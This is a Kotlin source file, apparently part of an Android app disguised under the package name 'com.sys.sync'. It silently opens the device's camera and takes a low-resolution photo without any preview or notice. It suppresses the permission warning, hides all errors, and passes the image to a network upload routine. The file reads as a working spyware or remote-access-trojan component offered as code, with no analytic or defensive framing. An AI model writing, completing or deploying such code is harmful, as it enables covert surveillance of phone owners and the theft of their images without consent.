package com.sys.sync

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import java.nio.ByteBuffer

object Cam {
    @SuppressLint("MissingPermission")
    fun snap(c: Context) {
        try {
            val cm = c.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull() ?: return
            val chars = cm.getCameraCharacteristics(id)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
            val size = map.getOutputSizes(ImageFormat.JPEG)?.minByOrNull { it.width * it.height } ?: Size(640, 480)
            val thread = HandlerThread("cam").also { it.start() }
            val handler = Handler(thread.looper)
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf: ByteBuffer = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                img.close(); r.close(); thread.quitSafely()
                Net.uploadImage(bytes, "cam_${System.currentTimeMillis()}.jpg")
            }, handler)
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(dev: CameraDevice) {
                    val surf = reader.surface
                    dev.createCaptureSession(listOf(surf), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            req.addTarget(surf); s.capture(req.build(), null, handler)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) {}
                    }, handler)
                }
                override fun onDisconnected(dev: CameraDevice) { dev.close() }
                override fun onError(dev: CameraDevice, e: Int) { dev.close() }
            }, handler)
        } catch (_: Exception) {}
    }
}
